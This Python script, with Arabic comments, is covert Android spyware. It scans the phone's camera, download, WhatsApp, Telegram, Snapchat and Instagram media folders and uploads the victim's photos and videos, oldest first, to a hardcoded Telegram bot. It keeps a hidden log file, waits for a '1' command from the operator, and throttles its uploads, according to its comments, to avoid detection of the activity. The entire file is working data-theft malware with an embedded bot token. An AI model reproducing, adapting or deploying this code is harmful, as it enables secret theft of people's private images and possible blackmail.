import os
import time
import requests

# معلومات البوت - ثابتة لضمان الاتصال
BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

# سجل البصمة لمنع التكرار نهائياً
LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"

def get_sent():
    """تحميل قائمة الملفات المرسلة سابقاً من السجل"""
    if not os.path.exists(LOG_FILE): return set()
    try:
        with open(LOG_FILE, "r") as f: 
            return set(f.read().splitlines())
    except: return set()

def save_sent(path):
    """حفظ مسار الملف في السجل لضمان عدم إرساله مرة أخرى"""
    try:
        with open(LOG_FILE, "a") as f: 
            f.write(path + "\n")
    except: pass

def send_file(path):
    """إرسال الملف (صورة أو فيديو) مع تحديد النوع تلقائياً لتيليجرام"""
    try:
        ext = path.lower()
        # اختيار الطريقة المناسبة بناءً على الامتداد
        if ext.endswith((".mp4", ".mkv", ".mov")):
            method = "sendVideo"
            file_key = "video"
        else:
            method = "sendDocument" # إرسال الصور كملفات لضمان الجودة ومنع تحويلها لملصقات
            file_key = "document"
            
        with open(path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", 
                data={"chat_id": CHAT_ID}, 
                files={file_key: f}, 
                timeout=120 # وقت كافٍ لرفع الفيديوهات
            )
        return r.status_code == 200
    except: return False

def check_for_command():
    """يفحص إذا أرسلت رقم (1) في البوت لبدء السحب"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        r = requests.get(url, params={"offset": -1}, timeout=10).json()
        if r.get("result"):
            last_msg = r["result"][-1].get("message", {}).get("text", "")
            if last_msg == "1":
                return True
    except: pass
    return False

def deep_scan_all():
    """بحث شامل وعميق عن الصور والفيديوهات مع ترتيبها من الأقدم للأحدث"""
    targets = [
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/WhatsApp/Media",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media",
        "/storage/emulated/0/Telegram",
        "/storage/emulated/0/Snapchat",
        "/storage/emulated/0/Instagram"
    ]
    sent = get_sent()
    found = []
    
    # الامتدادات المطلوبة (صور + فيديوهات)
    valid_exts = (".jpg", ".jpeg", ".png", ".mp4", ".mkv", ".mov")

    for base in targets:
        if not os.path.exists(base): continue
        for root, dirs, files in os.walk(base):
            # تخطي مجلدات الكاش والملفات المؤقتة لسرعة الأداء
            low_root = root.lower()
            if "cache" in low_root or ".thumbnails" in low_root:
                continue
            
            for file in files:
                if file.lower().endswith(valid_exts):
                    p = os.path.join(root, file)
                    if p not in sent:
                        try:
                            # فلترة الحجم: صور معقولة وفيديوهات لا تتعدى 30 ميجا
                            f_size = os.path.getsize(p)
                            if 10240 < f_size < 31457280:
                                found.append(p)
                        except: continue
    
    # الترتيب السحري: من الأقدم إلى الأحدث (لسحب الأرشيف أولاً)
    found.sort(key=os.path.getmtime)
    return found

def main():
    # انتظار بسيط لبدء استقرار النظام
    time.sleep(5)
    # إشعار عند تفعيل الشبح بنجاح
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "✅ تم تثبيت النظام بنجاح.. الشبح في وضع الاستعداد.\nأرسل رقم (1) لبدء سحب الأرشيف (أقدم الصور والفيديوهات أولاً)."})
    
    while True:
        try:
            if check_for_command():
                media_list = deep_scan_all()
                
                if not media_list:
                    # إذا لم يجد أي شيء نهائياً
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": "⚠️ لا يوجد شيء.. لم يتم العثور على أي صور أو فيديوهات في الجهاز."})
                else:
                    count = 0
                    # سحب وجبة من 100 ملف (صور وفيديوهات مخبوطة)
                    for p in media_list:
                        if count >= 100: break 
                        if send_file(p):
                            save_sent(p)
                            count += 1
                            # التأخير المطلوب (2 ثانية) لضمان عدم حظر البوت أو كشف النشاط
                            time.sleep(2) 
                    
                    # رسالة النجاح النهائي بعد انتهاء الوجبة
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": f"✅ تم سحب ({count}) ملف بنجاح (الأقدم فالأحدث). أرسل (1) للمزيد."})
            
            time.sleep(5) # فحص الأوامر كل 5 ثوانٍ
        except Exception:
            time.sleep(10) # إعادة المحاولة في حال حدوث خطأ في الاتصال

if __name__ == "__main__":
    main()
